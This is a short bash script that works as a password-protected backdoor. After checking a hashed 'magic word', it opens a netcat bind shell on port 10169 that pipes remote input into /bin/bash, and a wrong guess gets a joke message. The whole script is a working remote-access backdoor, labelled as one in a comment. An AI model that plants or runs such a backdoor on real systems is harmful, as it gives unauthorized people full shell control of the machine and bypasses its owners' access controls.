#!/bin/bash
lolnode=/tmp/.rofl
trap "rm -f /tmp/$lolnode /tmp/.pass" 1 2 8
read -p "Enter the Magic Word:" magic
printf $magic >/tmp/.pass
hash="a396572be01a534f1b6f9284ec20907dc9aede7e" #backdoorzrock

if echo "$hash */tmp/.pass" | sha1sum -c - > /dev/null 2>&1 ; then
  echo Access Granted!
  echo 'Starting the server...'
  mknod $lolnode p; (nc -l -p 10169 || nc -l 10169)0<$lolnode | \
  /bin/bash >$lolnode 2>&1; rm $lolnode

else 
  for i in $(seq 1 5); do
    echo "AH! AH! AH! You didn't say the magic word!"
    sleep 1
  done
fi

exit
